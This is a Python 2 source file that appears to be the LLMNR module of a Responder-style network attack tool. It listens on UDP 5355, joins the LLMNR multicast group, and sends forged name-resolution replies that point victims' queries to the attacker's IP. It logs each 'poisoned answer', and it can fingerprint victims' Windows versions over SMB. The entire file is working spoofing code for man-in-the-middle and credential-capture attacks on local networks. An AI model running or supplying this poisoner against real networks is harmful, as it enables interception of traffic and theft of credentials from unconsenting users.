#! /usr/bin/env python2.7

from SocketServer import UDPServer, ThreadingMixIn, BaseRequestHandler
import socket
import threading
import struct
import logging

from ..fingerprinter.Fingerprint import RunSmbFinger
from ..odict import OrderedDict
from ..packet import Packet
from ..common import *

responder_logger = logging.getLogger('responder')
logger2 = logging.getLogger('LLMNR/NBT-NS')
logger3 = logging.getLogger('Analyze LLMNR/NBT-NS')

class LLMNRPoisoner:

	global corevars; corevars = CoreVars.getInstance()

	def start(self):
		try:
			server = ThreadingUDPLLMNRServer(("0.0.0.0", 5355), LLMNR)
			t = threading.Thread(name="LLMNR", target=server.serve_forever) #LLMNR
			t.setDaemon(True)
			t.start()
		except Exception, e:
			print "Error starting LLMNRPoisoner on port %s: %s:" % (str(5355),str(e))

class ThreadingUDPLLMNRServer(ThreadingMixIn, UDPServer):

	allow_reuse_address = 1

	def server_bind(self):
		MADDR = "224.0.0.252"
		self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
		Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,socket.inet_aton(MADDR) + socket.inet_aton(corevars.OURIP))

		UDPServer.server_bind(self)

#LLMNR Answer packet.
class LLMNRAns(Packet):
	fields = OrderedDict([
		("Tid",              ""),
		("Flags",            "\x80\x00"),
		("Question",         "\x00\x01"),
		("AnswerRRS",        "\x00\x01"),
		("AuthorityRRS",     "\x00\x00"),
		("AdditionalRRS",    "\x00\x00"),
		("QuestionNameLen",  "\x09"),
		("QuestionName",     ""),
		("QuestionNameNull", "\x00"),
		("Type",             "\x00\x01"),
		("Class",            "\x00\x01"),
		("AnswerNameLen",    "\x09"),
		("AnswerName",       ""),
		("AnswerNameNull",   "\x00"),
		("Type1",            "\x00\x01"),
		("Class1",           "\x00\x01"),
		("TTL",              "\x00\x00\x00\x1e"),##Poison for 30 sec.
		("IPLen",            "\x00\x04"),
		("IP",               "\x00\x00\x00\x00"),
	])

	def calculate(self):
		self.fields["IP"] = socket.inet_aton(corevars.OURIP)
		self.fields["IPLen"] = struct.pack(">h",len(self.fields["IP"]))
		self.fields["AnswerNameLen"] = struct.pack(">h",len(self.fields["AnswerName"]))[1]
		self.fields["QuestionNameLen"] = struct.pack(">h",len(self.fields["QuestionName"]))[1]

def Parse_LLMNR_Name(data):
	NameLen = struct.unpack('>B',data[12])[0]
	Name = data[13:13+NameLen]
	return Name

def Parse_IPV6_Addr(data):
	if data[len(data)-4:len(data)][1] =="\x1c":
		return False
	if data[len(data)-4:len(data)] == "\x00\x01\x00\x01":
		return True
	if data[len(data)-4:len(data)] == "\x00\xff\x00\x01":
		return True
	else:
		return False

# LLMNR Server class.
class LLMNR(BaseRequestHandler):

	def handle(self):
		data, soc = self.request
		try:
			if data[2:4] == "\x00\x00":
				if Parse_IPV6_Addr(data):
					Name = Parse_LLMNR_Name(data)
					if corevars.AnalyzeMode:
						if Is_Finger_On(corevars.Finger_On_Off):
							try:
								Finger = RunSmbFinger((self.client_address[0],445))
								Message = "[Analyze mode: LLMNR] Host: %s is looking for : %s.\nOs Version is: %s Client Version is: %s"%(self.client_address[0], Name,Finger[0],Finger[1])
								logger3.warning(Message)
							except Exception:
								Message = "[Analyze mode: LLMNR] Host: %s is looking for : %s."%(self.client_address[0], Name)
								logger3.warning(Message)
						else:
							Message = "[Analyze mode: LLMNR] Host: %s is looking for : %s."%(self.client_address[0], Name)
							logger3.warning(Message)

					if DontRespondToSpecificHost(corevars.DontRespondTo):
						if RespondToIPScope(corevars.DontRespondTo, self.client_address[0]):
							return None

					if DontRespondToSpecificName(corevars.DontRespondToName) and DontRespondToNameScope(corevars.DontRespondToName.upper(), Name.upper()):
						return None 

					if RespondToSpecificHost(corevars.RespondTo):
						if corevars.AnalyzeMode == False:
							if RespondToIPScope(corevars.RespondTo, self.client_address[0]):
								if RespondToSpecificName(corevars.RespondToName) == False:
									buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
									buff.calculate()
									for x in range(1):
										soc.sendto(str(buff), self.client_address)
										Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
										#responder_logger.info(Message)
										logger2.warning(Message)
										if Is_Finger_On(corevars.Finger_On_Off):
											try:
												Finger = RunSmbFinger((self.client_address[0],445))
												#print '[+] OsVersion is:%s'%(Finger[0])
												#print '[+] ClientVersion is :%s'%(Finger[1])
												responder_logger.info('[+] OsVersion is:%s'%(Finger[0]))
												responder_logger.info('[+] ClientVersion is :%s'%(Finger[1]))
											except Exception:
												responder_logger.info('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
												pass

								if RespondToSpecificName(corevars.RespondToName) and RespondToNameScope(corevars.RespondToName.upper(), Name.upper()):
									buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
									buff.calculate()
									for x in range(1):
										soc.sendto(str(buff), self.client_address)
										Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
										#responder_logger.info(Message)
										logger2.warning(Message)
										if Is_Finger_On(corevars.Finger_On_Off):
											try:
												Finger = RunSmbFinger((self.client_address[0],445))
												#print '[+] OsVersion is:%s'%(Finger[0])
												#print '[+] ClientVersion is :%s'%(Finger[1])
												responder_logger.info('[+] OsVersion is:%s'%(Finger[0]))
												responder_logger.info('[+] ClientVersion is :%s'%(Finger[1]))
											except Exception:
												responder_logger.info('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
												pass

					if corevars.AnalyzeMode == False and RespondToSpecificHost(corevars.RespondTo) == False:
						if RespondToSpecificName(corevars.RespondToName) and RespondToNameScope(corevars.RespondToName.upper(), Name.upper()):
							buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
							buff.calculate()
							Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
							for x in range(1):
								soc.sendto(str(buff), self.client_address)

							logger2.warning(Message)
							if Is_Finger_On(corevars.Finger_On_Off):
								try:
									Finger = RunSmbFinger((self.client_address[0],445))
									#print '[+] OsVersion is:%s'%(Finger[0])
									#print '[+] ClientVersion is :%s'%(Finger[1])
									responder_logger.info('[+] OsVersion is:%s'%(Finger[0]))
									responder_logger.info('[+] ClientVersion is :%s'%(Finger[1]))
								except Exception:
									responder_logger.info('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
									pass
						if RespondToSpecificName(corevars.RespondToName) == False:
							 buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
							 buff.calculate()
							 Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
							 for x in range(1):
								 soc.sendto(str(buff), self.client_address)
							 logger2.warning(Message)
							 if Is_Finger_On(corevars.Finger_On_Off):
								 try:
									 Finger = RunSmbFinger((self.client_address[0],445))
									 #print '[+] OsVersion is:%s'%(Finger[0])
									 #print '[+] ClientVersion is :%s'%(Finger[1])
									 responder_logger.info('[+] OsVersion is:%s'%(Finger[0]))
									 responder_logger.info('[+] ClientVersion is :%s'%(Finger[1]))
								 except Exception:
									 responder_logger.info('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
									 pass
						else:
							pass
			else:
				pass
		except:
			raise